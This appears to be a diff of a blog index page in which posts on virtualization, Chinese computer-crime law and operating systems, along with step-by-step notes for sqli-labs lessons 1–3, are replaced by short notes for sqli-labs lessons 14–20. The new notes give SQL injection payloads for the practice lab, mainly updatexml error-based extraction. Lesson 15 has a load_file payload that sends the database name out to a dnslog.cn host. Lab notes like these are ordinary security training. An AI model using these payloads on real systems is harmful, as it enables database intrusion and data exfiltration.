@@ -64,10 +64,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-3" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-18" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-3/" class="article-date">
-  <time datetime="2022-03-24T16:22:17.958Z" itemprop="datePublished">2022-03-25</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.802Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-3/">sqli-labs less 3</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/">sqli-labs-less-18</a>
     </h1>
   
 
@@ -86,35 +86,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1.查看回显</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/1.png" alt="1.png (1255×625) (raw.githubusercontent.com)"></p>
-<p>2.判断闭合符号</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/2.png" alt="2.png (1254×626) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/3.png" alt="3.png (1255×666) (raw.githubusercontent.com)"></p>
-<p>单引号报错，双引号显示正常，从回显信息看，是由‘）进行闭合的，所以尝试’）</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/4.png" alt="4.png (1253×625) (raw.githubusercontent.com)"></p>
-<p>显示正常，所以参数是‘）进行闭合的。</p>
-<p>3.判断注入类型</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/5.png" alt="5.png (1254×619) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/6.png" alt="6.png (1254×617) (raw.githubusercontent.com)"></p>
-<p>4.判断列数</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/7.png" alt="7.png (1253×619) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/8.png" alt="8.png (1255×622) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/9.png" alt="9.png (1256×626) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/10.png" alt="10.png (1254×628) (raw.githubusercontent.com)"></p>
-<p>5.爆破数据库</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/11.png" alt="11.png (1257×623) (raw.githubusercontent.com)"></p>
-<p>6.爆破数据表/查询表名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/12.png" alt="12.png (1251×618) (raw.githubusercontent.com)"></p>
-<p>7.爆破字段/查询列名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/13.png" alt="13.png (1133×614) (raw.githubusercontent.com)"></p>
-<p>8.爆破值/查询数据</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson3/14.png" alt="14.png (1130×624) (raw.githubusercontent.com)"></p>
+        <p>注入语句：’,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/3.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-3/" data-id="cl157fhht00027gtrgpgobi0a" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/" data-id="cl1f7n02d0008q4tr2a2e5lc8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -124,10 +104,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-2" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-17" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-2/" class="article-date">
-  <time datetime="2022-03-24T16:22:17.955Z" itemprop="datePublished">2022-03-25</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.800Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -138,7 +118,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-2/">sqli-labs less 2</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/">sqli-labs-less-17</a>
     </h1>
   
 
@@ -146,31 +126,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1.判断闭合符号</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/1.png" alt="1.png (1134×622) (raw.githubusercontent.com)"></p>
-<p>2.判断类型</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/2.png" alt="2.png (1131×620) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/3.png" alt="3.png (1131×620) (raw.githubusercontent.com)"></p>
-<p>可知是整型，不必再添加必和符号。</p>
-<p>3.判断列数</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/4.png" alt="4.png (1138×622) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/5.png" alt="5.png (1133×620) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/6.png" alt="6.png (1137×629) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/7.png" alt="7.png (1131×625) (raw.githubusercontent.com)"></p>
-<p>可知列数为3</p>
-<p>4.爆破数据库</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/8.png" alt="8.png (1136×623) (raw.githubusercontent.com)"></p>
-<p>5.爆破数据表/查询表名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/9.png" alt="9.png (1131×618) (raw.githubusercontent.com)"></p>
-<p>6.爆破字段/查询列名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/10.png" alt="10.png (1153×625) (raw.githubusercontent.com)"></p>
-<p>7.爆破值/查询数据</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson2/11.png" alt="11.png (1920×883) (raw.githubusercontent.com)"></p>
+        <p>注入语句：’ and (updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson17/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson17/3.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-2/" data-id="cl157fhhs00017gtr6he8f1c6" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/" data-id="cl1f7n02d0007q4tr6ly78b61" class="article-share-link">Share</a>
       
       
     </footer>
@@ -180,10 +143,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-1" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-16" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-1/" class="article-date">
-  <time datetime="2022-03-24T16:22:17.953Z" itemprop="datePublished">2022-03-25</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.799Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -194,7 +157,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-1/">sqli-labs less 1</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/">sqli-labs-less-16</a>
     </h1>
   
 
@@ -202,35 +165,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1.先判断闭合符号，单引号报错 <a target="_blank" rel="noopener" href="http://45.32.113.109:11516/Less-1/?id=1&#39;">http://45.32.113.109:11516/Less-1/?id=1&#39;</a></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/1.png" alt="1.png (1068×702) (raw.githubusercontent.com)"></p>
-<p>在后面加上–+试一下 <a target="_blank" rel="noopener" href="http://45.32.113.109:11516/Less-1/?id=1&#39;--+">http://45.32.113.109:11516/Less-1/?id=1&#39;--+</a></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/2.png" alt="2.png (1072×705) (raw.githubusercontent.com)"></p>
-<p>2.判断一下注入类型 <a target="_blank" rel="noopener" href="http://45.32.113.109:11516/Less-1/?id=1">http://45.32.113.109:11516/Less-1/?id=1</a> and 1=1 和 <a target="_blank" rel="noopener" href="http://45.32.113.109:11516/Less-1/?id=1">http://45.32.113.109:11516/Less-1/?id=1</a> and 1=2 看页面回显位的反馈，如果一致，则是字符注入，否则是数字注入。</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/3.png" alt="3.png (1068×709) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/4.png" alt="4.png (1072×717) (raw.githubusercontent.com)"></p>
-<p>都显示正确，为字符注入</p>
-<p>3.判断列数</p>
-<p>从1试到3都正确，大于3后超出该数据库列数报错，列的个数为3</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/5.png" alt="5.png (1069×708) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/6.png" alt="6.png (1070×711) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/7.png" alt="7.png (1069×704) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/8.png" alt="8.png (1072×711) (raw.githubusercontent.com)"></p>
-<p>4.爆破数据库</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/9.png" alt="9.png (1072×707) (raw.githubusercontent.com)"></p>
-<p>5.爆破数据表/查询表名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/10.png" alt="10.png (1039×707) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/11.png" alt="11.png (1034×708) (raw.githubusercontent.com)"></p>
-<p>7.爆破字段/查询列名</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/12.png" alt="12.png (1920×881) (raw.githubusercontent.com)"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/13.png" alt="13.png (1097×763) (raw.githubusercontent.com)"></p>
-<p>9.爆破值/查询数据</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson1/14.png" alt="14.png (1096×762) (raw.githubusercontent.com)"></p>
+        <p>注入语句：admin”) and 1=1 – -</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson16/1.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-1/" data-id="cl157fhhk00007gtrg5qkf075" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/" data-id="cl1f7n02c0006q4tr5z70eada" class="article-share-link">Share</a>
       
       
     </footer>
@@ -240,10 +181,10 @@
 
 
   
-    <article id="post-学习笔记/虚拟化" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-15" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%8C%96/" class="article-date">
-  <time datetime="2022-03-24T15:08:25.663Z" itemprop="datePublished">2022-03-24</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.796Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -254,7 +195,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%8C%96/">虚拟化</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/">sqli-labs-less-15</a>
     </h1>
   
 
@@ -262,17 +203,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>虚拟化（Virtualization）是指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机，在一台计算机上同时运行多个逻辑计算机，每个逻辑计算机可运行不同的操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。虚拟化使用软件的方法重新定义划分IT资源，可以实现IT资源的动态分配、灵活调度、跨域共享，提高IT资源利用率，使IT资源能够真正成为社会基础设施，服务于各行各业中灵活多变的应用需求。</p>
-<p>按照其发展历史分为四个阶段：</p>
-<p>（1）硬件仿真虚拟化</p>
-<p>（2）完全虚拟化</p>
-<p>（3）半虚拟化</p>
-<p>（4）操作系统虚拟化</p>
+        <p>注入语句：admin’ and load_file(concat(“\\“,(database()),”.qyfyji.dnslog.cn\1.txt”)) –+</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson15/1.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%8C%96/" data-id="cl157fhi8000n7gtrchyj9w01" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/" data-id="cl1f7n02c0005q4tr1ra08zxl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -282,10 +219,10 @@
 
 
   
-    <article id="post-学习笔记/法律" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-14" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B3%95%E5%BE%8B/" class="article-date">
-  <time datetime="2022-03-24T15:08:25.659Z" itemprop="datePublished">2022-03-24</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/" class="article-date">
+  <time datetime="2022-03-31T16:27:15.795Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -296,7 +233,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B3%95%E5%BE%8B/">法律</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/">sqli-labs-less-14</a>
     </h1>
   
 
@@ -304,36 +241,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>《中华人民共和国刑法》</strong></p>
-<p>第二百八十五条</p>
-<p>第一款：违反国家规定，侵入国家事务，国防建设，尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。</p>
-<p>第二百八十六条</p>
-<p>第一款：违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。</p>
-<p>第二款：违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。</p>
-<p>第三款：故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</p>
-<p>《中华人民共和国刑法》（七）</p>
-<p>在刑法第二百八十五条中增加两款作为第二款、第三款：“违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金：情节特别严重的，处三年以下有期徒刑，并处罚金。”</p>
-<p>“提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具、情节严重的，依照前款的规定处罚。”</p>
-<p>《中华人民共和国刑法》（九）</p>
-<p>在刑法第二百八十五条中增加一款作为第四款：“单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。”</p>
-<p>在刑法第二百八十六条中增加一款作为第四款：“单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。”</p>
-<p>在刑法第二百八十六条中增加一条，作为第二百八十六条之一：“网络服务提供者不履行法律、行政法规规定的信息网络安全管理义务，经监管部门责令采取改正措施而拒不改正，有下列情形之一的，处三年以下有期徒刑、拘役或者管制，并处或者单处罚金：</p>
-<p>（一）致使违法信息大量传播的；</p>
-<p>（二）致使用户信息泄露，造成严重后果的；</p>
-<p>（三）致使刑事案件证据灭失，情节严重的；</p>
-<p>（四）有其他严重情节的。</p>
-<p>“单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接负责人员，依照前款的规定处罚。”</p>
-<p>“有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。”</p>
-<p><strong>《网络安全法》</strong></p>
-<p>《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，自2017年6月1日起施行。它是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。</p>
-<p>《中华人民共和国密码法》由中华人民共和国第十三届全国人民代表大会常务委员会第十四次会议于2019年10月26日通过，自2020年1月1日起施行。</p>
-<p>《中华人民共和国数据安全法》2021年6月10日，第十三届全国人民代表大会常务委员会第二十九次会议通过该法律，自2021年9月1日起施行。它规范数据处理活动，保障数据安全，促进数据开发利用，保护个人，组织的合法权益，维护国家主权，安全和发展利益，制定的法律。</p>
-<p>《个人信息保护法》2021年8月20日，十三届全国人大常委会第三十次会议表决通过《中华人民共和国个人信息保护法》，自2021年11月1日起施行。</p>
+        <p>注入语句：admin” union select updatexml(1,concat(0x7e,(select user()),0x7e),1) –+</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson14/1.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B3%95%E5%BE%8B/" data-id="cl157fhi7000m7gtrexw44ii8" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/" data-id="cl1f7n0280001q4trhnpo97ar" class="article-share-link">Share</a>
       
       
     </footer>
@@ -343,10 +257,10 @@
 
 
   
-    <article id="post-学习笔记/操作系统" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-20" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" class="article-date">
-  <time datetime="2022-03-24T15:08:25.658Z" itemprop="datePublished">2022-03-24</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/" class="article-date">
+  <time datetime="2022-03-31T16:27:13.754Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -357,7 +271,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/">sqli-labs-less-20</a>
     </h1>
   
 
@@ -365,28 +279,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>操作系统功能</strong></p>
-<p>进程管理：其工作主要是进程调度，在单用户单任务的情况下，处理器仅为一个用户的一个任务所独占，进程管理的工作十分简单。但在多道程序或多用户的情况下，组织多个作业或任务时，就要解决处理器的调度、分配和回收等问题。</p>
-<p>存储管理分为以下几种功能：存储分配、存储共享、存储保护、存储扩张。</p>
-<p>设备管理有以下几种功能：设备分配、设备传输控制、设备独立性。</p>
-<p>文件管理：文件存储空间的管理、目录管理、文件操作管理、文件保护。</p>
-<p>作业管理：负责处理用户提交的任何要求。</p>
-<p><strong>操作系统分类</strong></p>
-<p>计算机操作系统主要分类：</p>
-<p>操作系统包含：类Unix和Windows两大阵营。</p>
-<p>类Unix包含：Linux、Mac OS等。</p>
-<p>Windows包含：Windows PC、Windows Server等。</p>
-<p>我们常见的Win PC版系统有Win XP、Win 7、Win 10等。</p>
-<p>其中Win XP常被用于银行，ATM等更新换代比较慢的地方。</p>
-<p>我们常见的Windows Server服务器操作系统有2003、2012、2019等。</p>
-<p>以上系统常被用来搭建IIS，SQLServer服务器。</p>
-<p>我们常见Unix/Linux系统有Debian、Red Hat等。</p>
-<p>其中Kali Linux是基于Debian的Linux发行版，设计用于数字取证操作系统，并且预装了许多渗透测软件，包括nmap、Wireshark、John the Ripper等。</p>
-
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" data-id="cl157fhi7000l7gtr7f3javbq" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/" data-id="cl1f7n02g000aq4tr1gx6707n" class="article-share-link">Share</a>
       
       
     </footer>
@@ -396,10 +293,10 @@
 
 
   
-    <article id="post-学习笔记/总结Cookie和Session的异同点" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-19" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%80%BB%E7%BB%93Cookie%E5%92%8CSession%E7%9A%84%E5%BC%82%E5%90%8C%E7%82%B9/" class="article-date">
-  <time datetime="2022-03-24T15:08:25.656Z" itemprop="datePublished">2022-03-24</time>
+    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/" class="article-date">
+  <time datetime="2022-03-31T16:27:13.753Z" itemprop="datePublished">2022-04-01</time>
 </a>
     
   </div>
@@ -410,7 +307,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%80%BB%E7%BB%93Cookie%E5%92%8CSession%E7%9A%84%E5%BC%82%E5%90%8C%E7%82%B9/">总结Cookie和Session的异同点</a>
